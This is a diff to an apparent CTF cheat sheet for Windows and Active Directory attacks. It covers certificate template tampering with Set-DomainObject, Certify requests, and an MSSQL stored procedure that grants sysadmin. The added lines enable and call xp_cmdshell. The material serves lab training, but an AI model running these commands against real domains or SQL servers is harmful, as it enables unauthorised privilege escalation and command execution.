@@ -11,7 +11,7 @@ description: "Dump of important commands and tools in windows CTF challenges."
 Mythic: make_token <domainName>\<username> <passworD>
 ```
 
-## Create computer accounts:
+## Create computer accounts
 
 ```powershell
 ##StandIn: 
@@ -30,7 +30,6 @@ Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN
 
 Set-DomainObject -SearchBase "CN=Certificate Tempaltes,CN=Public Key Services,CN=Services,CN=Configuration,DC=mythical-us,DC=vl" -Identity Machine -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
 ```
-
 
 ## Request the certificate for admin with certify
 
@@ -77,10 +76,18 @@ SELECT rp.name as database_role, mp.name as database_user FROM sys.database_role
 CREATE OR ALTER PROCEDURE dbo.xct WITH EXECUTE AS owner AS ALTER SERVER ROLE sysadmin ADD MEMBER [MYTHICAL-EU\svc_sql];
 ```
 
-## Run the stored procedure 
+## Run the stored procedure
 
 ```sql
 EXEC dbo.xct;
 ```
 
-After this you can enable xp_cmdshell and have command execution/privilage escalation.
+## After this you can enable xp_cmdshell and have command execution/privilage escalation
+
+```sql
+EXEC sp_configure 'show advanced options',1; Reconfigure;
+
+EXEC sp_configure 'xp_cmdshell',1; Reconfigure;
+
+EXEC xp_cmdshell 'whoami'
+```
